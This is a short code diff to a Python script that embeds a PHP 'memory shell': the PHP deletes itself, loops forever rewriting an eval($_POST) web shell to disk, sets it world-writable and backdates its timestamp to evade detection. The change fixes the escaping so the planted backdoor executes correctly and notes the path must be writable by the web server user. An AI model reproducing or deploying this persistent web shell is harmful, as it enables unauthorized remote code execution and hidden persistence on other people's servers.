@@ -3,6 +3,7 @@
 
 import random
 
+# notice: $name should be a valid path which `www-data` can write file
 memoryShellPHP = '''
 <?php
 
@@ -11,7 +12,7 @@ ignore_user_abort(1);
 unlink(__FILE__);
 while (1) {
     $name = "%s";
-    file_put_contents("./$name", "<?php eval($_POST['$%s'])?>");
+    file_put_contents("./$name", "<?php eval(\$_POST['%s'])?>");
     system("chmod 777 $name");
     touch("./$name", mktime(20, 15, 1, 11, 28, 2016));
     usleep(100);
